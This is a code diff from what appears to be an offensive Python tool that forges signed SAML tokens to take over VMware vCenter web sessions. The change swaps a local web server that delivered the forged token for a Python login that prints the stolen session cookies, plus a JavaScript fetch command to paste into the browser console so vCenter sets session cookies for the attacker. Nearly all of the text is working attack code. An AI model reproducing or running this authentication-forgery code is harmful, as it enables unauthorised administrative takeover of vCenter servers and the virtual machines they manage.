@@ -2037,61 +2037,32 @@ def main():
                                                      key_pem, cert1_pem, cert2_pem, authn_id)
 
         if choice == '1':
-            import json, socket, threading
-            from http.server import HTTPServer, BaseHTTPRequestHandler
+            import json
+            # Python-side login — proves the token works and shows the cookie values
+            cname, cval, ui_session = saml_login(target, signed, relay_state)
+            print(f'\n[+] https://{target}/ui/')
+            print(f'    {cname}={cval}')
+            for extra in ('VSPHERE-CLIENT-SESSION-INDEX', 'VSPHERE-USERNAME'):
+                v = ui_session.cookies.get(extra)
+                if v:
+                    print(f'    {extra}={v}')
 
-            saml_b64 = base64.b64encode(signed).decode()
-            sso_url  = f'https://{target}/ui/saml/websso/sso'
-            ui_url   = f'https://{target}/ui/'
-            html_bytes = '\n'.join([
-                '<!DOCTYPE html><html><head><title>vCenter SSO</title></head><body>',
-                '<p>Logging in to vCenter&#8230;</p>',
-                '<script>',
-                '(async function() {',
-                '  const p = new URLSearchParams();',
-                f'  p.append("SAMLResponse", {json.dumps(saml_b64)});',
-                f'  p.append("RelayState", {json.dumps(relay_state)});',
-                f'  await fetch({json.dumps(sso_url)}, {{',
-                '    method: "POST", mode: "no-cors", credentials: "include",',
-                '    headers: {"Content-Type": "application/x-www-form-urlencoded"},',
-                '    body: p.toString()',
-                '  }).catch(function(){});',
-                f'  window.location.replace({json.dumps(ui_url)});',
-                '})();',
-                '</script>',
-                '</body></html>',
-                '',
-            ]).encode()
-
-            class _Handler(BaseHTTPRequestHandler):
-                def do_GET(self):
-                    self.send_response(200)
-                    self.send_header('Content-Type', 'text/html; charset=utf-8')
-                    self.send_header('Content-Length', str(len(html_bytes)))
-                    self.end_headers()
-                    self.wfile.write(html_bytes)
-                def log_message(self, *_):
-                    pass
-
-            srv = HTTPServer(('0.0.0.0', 0), _Handler)
-            port = srv.server_address[1]
-
-            try:
-                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as _s:
-                    _s.connect((target, 80))
-                    local_ip = _s.getsockname()[0]
-            except Exception:
-                local_ip = '0.0.0.0'
-
-            print(f'\n[+] SAML login page ready — open in any browser on this network:')
-            print(f'    http://{local_ip}:{port}/')
-            print(f'\n    The page will submit the SAML token and redirect you to:')
-            print(f'    https://{target}/ui/')
-            print(f'\n    Ctrl-C to stop the server.')
-            try:
-                srv.serve_forever()
-            except KeyboardInterrupt:
-                pass
+            # Fresh SAML for browser delivery — the console fetch runs same-origin
+            # from within the vCenter page, so vCenter sets HttpOnly cookies directly.
+            authn_id2, relay_state2 = get_saml_authn_request(target)
+            signed2   = build_and_sign_saml(target, hostname, domain,
+                                            key_pem, cert1_pem, cert2_pem, authn_id2)
+            saml_b64  = base64.b64encode(signed2).decode()
+            js_cmd = ''.join([
+                "fetch('/ui/saml/websso/sso',{",
+                "method:'POST',credentials:'include',",
+                "headers:{'Content-Type':'application/x-www-form-urlencoded'},",
+                f"body:new URLSearchParams([['SAMLResponse',{json.dumps(saml_b64)}],",
+                f"['RelayState',{json.dumps(relay_state2)}]])",
+                "}).then(()=>location.replace('/ui/'));",
+            ])
+            print(f'\n[+] Open DevTools (F12) on https://{target}/ and paste in Console:')
+            print(f'\n    {js_cmd}')
             return
 
         cname, cval, ui_session = saml_login(target, signed, relay_state)
